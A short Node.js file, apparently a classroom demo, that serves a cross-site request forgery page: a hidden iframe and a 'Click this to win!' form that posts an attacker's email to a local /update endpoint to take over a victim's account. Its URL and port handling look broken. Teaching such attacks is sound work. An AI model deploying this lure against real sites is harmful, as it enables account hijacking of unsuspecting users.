// in backend/csrf-server-bad.js
const dotenv = require("dotenv").config();

const http = require("http");
const attackerEmail = "attacker@example.com";
const server = http.createServer((req, res) => {
  res.writeHead(200, { "Content-Type": "text/html" });
  res.end(`
<iframe name=hide style="position:absolute;left:-1000px"></iframe>
<form method="post" action="http://localhost:process.env.PORT/update" target="hide">
<input type="hidden" name="email" value="${attackerEmail}">
<input type="submit" value="Click this to win!">
</form>`);
});
server.listen(process.env.COLLECTE, () => {
  console.log("Le serveur ecoute sur le port ***1");
});
